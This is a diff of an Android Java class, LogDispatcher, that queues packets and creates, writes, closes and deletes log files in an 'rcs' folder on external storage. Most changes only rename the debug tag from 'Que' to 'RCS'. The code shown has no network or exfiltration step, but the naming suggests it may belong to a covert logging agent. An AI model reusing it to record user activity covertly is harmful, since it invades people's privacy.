@@ -49,7 +49,7 @@ public class LogDispatcher extends Thread implements Runnable {
 	// 4 bytes -> .mrk
 	private void processQueue() {
 		Packet p;
-		//Log.d("Que", "processQueue() Packets in Queue: " + q.size());
+		//Log.d("RCS", "processQueue() Packets in Queue: " + q.size());
 		
 		if (q.size() == 0)
 			return;
@@ -63,45 +63,45 @@ public class LogDispatcher extends Thread implements Runnable {
 
 		switch (p.getCommand()) {
 			case LogR.LOG_CREATE:
-				Log.d("Que", "processQueue() got LOG_CREATE");
+				Log.d("RCS", "processQueue() got LOG_CREATE");
 				createLog(p);
 				break;
 				
 			case LogR.LOG_ADDITIONAL:
-				Log.d("Que", "processQueue() got LOG_ADDITIONAL");
+				Log.d("RCS", "processQueue() got LOG_ADDITIONAL");
 				break;
 				
 			case LogR.LOG_APPEND:
-				Log.d("Que", "processQueue() got LOG_APPEND");
+				Log.d("RCS", "processQueue() got LOG_APPEND");
 				break;
 				
 			case LogR.LOG_WRITE:
-				Log.d("Que", "processQueue() got LOG_WRITE");
+				Log.d("RCS", "processQueue() got LOG_WRITE");
 				writeLog(p);
 				break;
 				
 			case LogR.LOG_CLOSE:
-				Log.d("Que", "processQueue() got LOG_CLOSE");
+				Log.d("RCS", "processQueue() got LOG_CLOSE");
 				closeLog(p);
 				break;
 				
 			case LogR.LOG_REMOVE:
-				Log.d("Que", "processQueue() got LOG_REMOVE");
+				Log.d("RCS", "processQueue() got LOG_REMOVE");
 				removeLog(p);
 				break;
 			
 			case LogR.LOG_REMOVEALL:
-				Log.d("Que", "processQueue() got LOG_REMOVEALL");
+				Log.d("RCS", "processQueue() got LOG_REMOVEALL");
 				removeAll();
 				break;
 
 			case LogR.LOG_WRITEMRK:
-				Log.d("Que", "processQueue() got LOG_WRITEMRK");
+				Log.d("RCS", "processQueue() got LOG_WRITEMRK");
 				writeMarkup(p);
 				break;
 
 			default:
-				Log.d("Que", "processQueue() got LOG_UNKNOWN");
+				Log.d("RCS", "processQueue() got LOG_UNKNOWN");
 				break;
 		}
 		
@@ -121,7 +121,7 @@ public class LogDispatcher extends Thread implements Runnable {
 	}
 
 	public void run() {
-		Log.d("Que", "LogDispatcher started");
+		Log.d("RCS", "LogDispatcher started");
 		
 		// Create log directory
 		sdDir = new File(Environment.getExternalStorageDirectory(), "rcs");
@@ -138,10 +138,10 @@ public class LogDispatcher extends Thread implements Runnable {
 					noLogs.await();
 
 				// Halt command has precedence over queue processing
-				if (halt) {
+				if (halt == true) {
 					q.clear();
 					logMap.clear();
-					Log.d("Que", "LogDispatcher closing");
+					Log.d("RCS", "LogDispatcher closing");
 					return;
 				}
 				
@@ -195,13 +195,13 @@ public class LogDispatcher extends Thread implements Runnable {
 			} while (file.createNewFile() == false);
 			
 			if (logMap.containsKey(p.getId()) == true) {
-				Log.d("Que", "Duplicate log entry");
+				Log.d("RCS", "Duplicate log entry");
 				return false;
 			}
 			
 			logMap.put(p.getId(), file);
 		} catch (Exception e) {
-			Log.d("Que", "LogDispatcher.createLog() exception detected");
+			Log.d("RCS", "LogDispatcher.createLog() exception detected");
 			e.printStackTrace();
 			return false;
 		}
@@ -225,7 +225,7 @@ public class LogDispatcher extends Thread implements Runnable {
 			
 			return true;
 		} catch (Exception e) {
-			Log.d("Que", "LogDispatcher.createLog() exception detected");
+			Log.d("RCS", "LogDispatcher.createLog() exception detected");
 			e.printStackTrace();
 			return false;
 		}
@@ -245,7 +245,7 @@ public class LogDispatcher extends Thread implements Runnable {
 			} while (file.createNewFile() == false);
 			
 			if (logMap.containsKey(p.getId()) == true) {
-				Log.d("Que", "Duplicate log entry");
+				Log.d("RCS", "Duplicate log entry");
 				return false;
 			}
 			
@@ -273,7 +273,7 @@ public class LogDispatcher extends Thread implements Runnable {
 	
 	private boolean closeLog(Packet p) {
 		if (logMap.containsKey(p.getId()) == false) {
-			Log.d("Que", "Requested log not found");
+			Log.d("RCS", "Requested log not found");
 			return false;
 		}
 		
@@ -293,7 +293,7 @@ public class LogDispatcher extends Thread implements Runnable {
 	
 	private boolean removeLog(Packet p) {
 		if (logMap.containsKey(p.getId()) == false) {
-			Log.d("Que", "LogDispatcher.removeLog() Requested log not found");
+			Log.d("RCS", "LogDispatcher.removeLog() Requested log not found");
 			return false;
 		}
 		
@@ -311,7 +311,7 @@ public class LogDispatcher extends Thread implements Runnable {
 		File file[] = sdRemove.listFiles(new ExtensionFilter(".log"));
 		
 		for (File f : file) {
-			Log.d("Que", "Log list: " + f.getName());
+			Log.d("RCS", "Log list: " + f.getName());
 			f.delete();
 		}
 	}
